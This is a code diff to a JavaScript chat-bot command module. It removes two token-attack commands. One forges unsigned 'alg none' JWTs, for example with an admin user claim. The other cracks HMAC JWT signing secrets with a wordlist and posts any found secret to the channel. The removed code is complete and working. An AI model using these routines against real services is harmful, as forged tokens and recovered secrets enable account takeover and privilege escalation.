@@ -1,6 +1,4 @@
-const crypto = require("node:crypto");
 const fs = require("node:fs");
-const readline = require("node:readline");
 const config = require("../config");
 
 function cut(s) {
@@ -330,61 +328,6 @@ async function userCheck(message, name) {
   );
 }
 
-function jwtForge(payloadText) {
-  let payload;
-  try {
-    payload = JSON.parse(payloadText);
-  } catch {
-    return null;
-  }
-  const b64u = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
-  return b64u({ alg: "none", typ: "JWT" }) + "." + b64u(payload) + ".";
-}
-
-async function jwtCrack(message, tok) {
-  const parts = (tok || "").trim().split(".");
-  if (parts.length !== 3) {
-    await message.channel.send("Usage: `ts jwt crack <token>`");
-    return;
-  }
-  let alg;
-  try {
-    alg = JSON.parse(Buffer.from(parts[0], "base64").toString("utf8")).alg;
-  } catch {
-    await message.channel.send("Unreadable header.");
-    return;
-  }
-  const hash = { HS256: "sha256", HS384: "sha384", HS512: "sha512" }[alg];
-  if (!hash) {
-    await message.channel.send("Only HS256/HS384/HS512 supported. Try `ts jwt none` for unsigned.");
-    return;
-  }
-  if (!fs.existsSync(config.wordlist)) {
-    await message.channel.send("Wordlist not found at `" + config.wordlist + "`. Set WORDLIST.");
-    return;
-  }
-  await message.channel.send("Cracking " + alg + ", runs until found or the list ends…");
-  const signing = parts[0] + "." + parts[1];
-  const target = Buffer.from(parts[2].replace(/-/g, "+").replace(/_/g, "/"), "base64");
-  let tried = 0;
-  const cap = 5000000;
-  try {
-    const rl = readline.createInterface({ input: fs.createReadStream(config.wordlist), crlfDelay: Infinity });
-    for await (const line of rl) {
-      const w = line.replace(/\r$/, "");
-      tried++;
-      const mac = crypto.createHmac(hash, w).update(signing).digest();
-      if (mac.length === target.length && crypto.timingSafeEqual(mac, target)) {
-        await message.channel.send("Secret: `" + w + "` (" + tried + " tries)");
-        rl.close();
-        return;
-      }
-      if (tried >= cap) break;
-    }
-  } catch {}
-  await message.channel.send("Not found in first " + tried + " entries.");
-}
-
 module.exports = async function hunt(client, message) {
   const p = config.commandPrefix;
   const content = message.content || "";
@@ -459,15 +402,6 @@ module.exports = async function hunt(client, message) {
   }
   if (lower.startsWith(p + "user ")) {
     await userCheck(message, arg(p + "user ").split(/\s+/)[0] || "");
-    return true;
-  }
-  if (lower.startsWith(p + "jwt none ")) {
-    const out = jwtForge(arg(p + "jwt none "));
-    await message.channel.send(out === null ? "Usage: `ts jwt none {\"user\":\"admin\"}`" : cut(out));
-    return true;
-  }
-  if (lower.startsWith(p + "jwt crack ")) {
-    await jwtCrack(message, arg(p + "jwt crack ").split(/\s+/)[0] || "");
     return true;
   }
   return false;
